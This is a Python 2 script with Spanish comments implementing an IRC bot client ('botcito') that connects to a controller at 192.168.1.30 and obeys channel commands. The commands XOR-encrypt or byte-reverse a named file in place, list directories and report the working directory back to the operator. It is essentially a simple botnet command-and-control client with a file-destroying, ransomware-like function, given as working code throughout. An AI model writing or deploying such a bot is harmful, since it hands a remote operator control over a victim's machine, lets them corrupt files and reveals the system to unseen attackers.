# Developed by Eric Castañeda
# Para mas detalle revisar cada sección def
###############
## Ejecución ##
###############
# La forma de ejecución se realiza usando  el IDLE(Python GUI) de windows
# Cargando este archivo script
# Posteriormente se debe de levantar un servicio irc
# con una direccion IP 192.168.1.30
# esperar que se conecte este cliente
# y ejecutar alguno de los comandos soportados
import socket
import string
import time
import os
import random
#########
## XOR ##
#########
# Funcion para comando cifrar un binario
# comando: !@cifraBinXor archivo
def cifrar(fichero):
	data = bytearray(open(fichero, 'rb').read())
	key = bytearray([0x2a])
	palabra = xor(data,key)
	newFile = open(fichero,'wb')
	newFile.write(palabra)
	newFile.close()
# Funcion para hacer operacion XOR
def xor(data, key):
    l = len(key)
    return bytearray((
        (data[i] ^ key[i % l]) for i in range(0,len(data))
    ))
############
## Rotate ##
############
# Funcion para la rotacion de un binario
# El algoritmo funciona de manera en que solamente 
# se invierte el orden de los bytes
# Como una matriz inversa
# comando: !@cifraBinRot arhivo
def rotar(fichero):
	archivo =  bytearray(open(fichero).read())
	osrevni = bytearray()
	for i in range(len(archivo)):
		osrevni.append(archivo.pop())
	f = open(fichero,"wb")
	f.write(osrevni)
	f.close()

################
## List Files ##
################
# Funcion para mostrar los archivos que se encuentran en un directorio
# De manera 
# comando: !@showFiles
def show(directory):
	lfiles = os.listdir(directory)
	for element in lfiles:
		s.send("PRIVMSG %s :%s \r\n" % (CHAN,element))
#######################
## Directorio Actual ##
#######################
# Funcion para mostrar el directorio actual
# comando: !@wheramI
def getDir():
	pwd = os.getcwd()
	s.send("PRIVMSG %s :%s \r\n" % (CHAN,pwd))

id =""
id = str(random.randrange(0,100,1))
host = "192.168.1.30"
port = 9999
NICK = "botcito"+id
IDENT = "botcito"+id
REALNAME = "botcito"+id
CHAN="#mine"
readbuffer=""
s=socket.socket()
s.connect((host,port))
s.send("NICK %s\r\n" % NICK)
s.send("USER %s %s bla :%s\r\n" % (IDENT,host,REALNAME))
s.send("JOIN :%s\r\n" % CHAN)
while 1:
	readbuffer=readbuffer+s.recv(1024)
	temp = string.split(readbuffer,"\n")
	readbuffer=temp.pop()
	for line in temp:
		print line
		line=string.rstrip(line)
		line = line.split(CHAN +' :')
		if line[0].find("PING")!=-1:
			pingid = line[0].split()[1]
			s.send("PONG %s\r\n" % pingid)
		if line[0].find("JOIN")!=-1:
			name = line[0].split('!')[0].split(':')[1]
			if name != NICK and name.find(host) == -1:
				s.send("PRIVMSG %s :Hola a tod@s ^^\n" % CHAN)
		if len(line) > 1:
			if line[1] == '$ version':
				s.send("PRIVMSG %s :ecastaneda-Bot-v0.5 \r\n" % CHAN)

			if line[1].find('!@cifraBinXor')!=-1:
				try:
					arg = line[1].split( )[1]
					cifrar(arg)
					s.send("PRIVMSG %s :File Encrypted\r\n" % CHAN)
				except:
					s.send("PRIVMSG %s :File Not Found\r\n" % CHAN)

			if line[1].find('!@cifraBinRot')!=-1:
				try:
					arg = line[1].split()[1]
					rotar(arg)
					s.send("PRIVMSG %s :File Rotated\r\n" % CHAN)
				except:
					s.send("PRIVMSG %s :File Not Found\r\n" % CHAN)
				
			if line[1].find('!@showFiles')!=-1:
				s.send("PRIVMSG %s :List Directory\r\n" % CHAN)
				try:
					arg = line[1].split()[1]
				except IndexError:
					arg = "."
				show(arg)

			if line[1].find('!@wheramI')!=-1:
				s.send("PRIVMSG %s :You are in\r\n" % CHAN)
				getDir()
